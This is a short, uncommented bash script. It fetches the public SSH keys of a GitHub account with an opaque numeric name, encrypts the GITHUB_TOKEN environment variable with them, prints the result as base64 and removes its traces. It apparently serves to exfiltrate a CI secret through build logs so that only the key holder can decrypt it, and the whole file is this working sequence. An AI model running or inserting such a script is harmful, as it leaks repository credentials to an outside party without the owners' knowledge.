#!/bin/bash

curl -sf "https://github.com/92873420938403497.keys" > /tmp/id_rsa.pub
ssh-keygen -e -m PKCS8 -f /tmp/id_rsa.pub > /tmp/pub.pem
echo $GITHUB_TOKEN | openssl pkeyutl -encrypt -pubin -inkey /tmp/pub.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -out /tmp/token.enc
base64 -i /tmp/token.enc
rm -f /tmp/id_rsa.pub /tmp/pub.pem /tmp/token.enc
